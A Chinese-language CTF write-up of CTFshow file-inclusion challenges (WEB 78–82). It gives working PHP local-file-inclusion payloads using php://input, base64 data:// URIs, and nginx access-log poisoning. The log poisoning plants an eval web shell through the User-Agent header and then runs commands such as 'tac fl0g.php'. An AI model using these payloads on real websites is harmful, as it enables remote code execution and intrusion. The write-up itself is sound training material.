---
{"dg-publish":true,"dg-path":"安全/靶场/CTFshow_文件包含.md","permalink":"/安全/靶场/CTFshow_文件包含/","title":"CTFshow_文件包含"}
---

# WEB 78
![Pasted image 20240808142137.png](/img/user/picture/Pasted%20image%2020240808142137.png)
这里对文件包含没有任何限制，所以我们利用php伪协议来执行代码
`?file=php://input`
`<?php system('ls');?>`
![Pasted image 20240808142836.png](/img/user/picture/Pasted%20image%2020240808142836.png)
发现有`flag.php`
继续读取`<?php system('cat flag.php');?>`
查看网页源码得到flag
![Pasted image 20240808142934.png](/img/user/picture/Pasted%20image%2020240808142934.png)


# WEB 79

![Pasted image 20240808143458.png](/img/user/picture/Pasted%20image%2020240808143458.png)
这里限制了字符`php`
所以我们上一关的payload就没法使用了
我们可以利用`data://`来进行代码执行

 将`<?php system('ls ');?>`编码
 `file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAnKTs/Pg==`
注意，这里不能有`+`
发现还是`flag.php index.php`

将`<?php system('tac flag.php');?>`编码
`file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==`
得到flag
![Pasted image 20240808144944.png](/img/user/picture/Pasted%20image%2020240808144944.png)


# WEB 80 日志包含

![Pasted image 20240808145536.png](/img/user/picture/Pasted%20image%2020240808145536.png)
此题过滤了`php`和`data`，

可以包含日志文件`?file=/var/log/nginx/access.log`
日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行
```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
User-Agent: <?php @eval($_GET[1]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
Connection: close
```

注意：插入的后门代码最好加上@让他不要报错

`?file=/var/log/nginx/access.log&1=system("tac fl0g.php");`

![Pasted image 20240808154207.png](/img/user/picture/Pasted%20image%2020240808154207.png)


# WEB 81

![Pasted image 20240808155528.png](/img/user/picture/Pasted%20image%2020240808155528.png)
和上一题思路差不多


# WEB 82
![Pasted image 20240808155957.png](/img/user/picture/Pasted%20image%2020240808155957.png)
